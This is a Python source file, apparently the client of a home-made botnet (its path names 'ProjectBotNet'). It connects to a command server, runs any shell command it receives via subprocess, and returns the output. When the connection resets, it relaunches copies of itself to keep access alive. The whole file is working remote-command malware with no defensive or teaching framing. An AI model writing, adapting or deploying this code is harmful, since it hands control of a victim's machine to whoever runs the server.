import socket
import subprocess
import time
import datetime
import os

# Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999

while True:
    try:
        # Connect to server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        
        print("$$$CONNECTED$$$")

        while True:
            try:
                # Receive command from server
                command = client_socket.recv(1024).decode()
                if not command:
                    continue

                print(f"Received command from server: {command}")

                if command.startswith("CLOSE*con"):
                    print("Received close command from server. Closing client program.")
                    print("CLOSING IN 5")
                    time.sleep(1)
                    print("4")
                    time.sleep(1)
                    print("3")
                    time.sleep(1)
                    print("2")
                    time.sleep(1)
                    print("1")
                    time.sleep(1)
                    print("0")
                    break

                # Execute command and send result back
                result = subprocess.getoutput(command)
                client_socket.send(result.encode())
            except ConnectionResetError:
                print(f"[-] Connection to server reset. Reconnecting...")
                os.system("start python E:\enchant\sbin\website(s)\YV-Ideology\ProjectBotNet\client.py && exit")
                os.system("start python E:\enchant\sbin\website(s)\YV-Ideology\ProjectBotNet\client.py && exit")
                break

        client_socket.close()
        break  # Exit the outer loop if the close command is received
    except ConnectionRefusedError:
        print("Connection refused. Retrying in 1 seconds...")
        time.sleep(1)
    except Exception as e:
        print(f"Error: {e}")
        #os.system("start python E:\enchant\sbin\website(s)\YV-Ideology\ProjectBotNet\client.py && exit")
